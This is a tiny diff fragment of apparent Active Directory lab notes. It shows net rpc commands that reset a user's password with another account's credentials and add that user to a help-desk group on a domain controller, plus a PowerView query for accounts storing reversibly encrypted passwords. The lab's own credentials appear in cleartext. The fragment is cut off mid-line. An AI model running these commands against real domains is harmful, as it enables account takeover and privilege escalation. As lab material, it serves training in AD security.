@@ -25,3 +25,5 @@ net rpc password 'damundsen' 'P@ssword1' -U "INLANEFREIGHT.LOCAL"/"wley"%"transp
 net rpc group addmem "HELP DESK LEVEL 1" "damundsen" -U "INLANEFREIGHT.LOCAL"/"damundsen"%"P@ssword1" -S "ACADEMY-EA-DC01"
 ```
 Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select
+
+
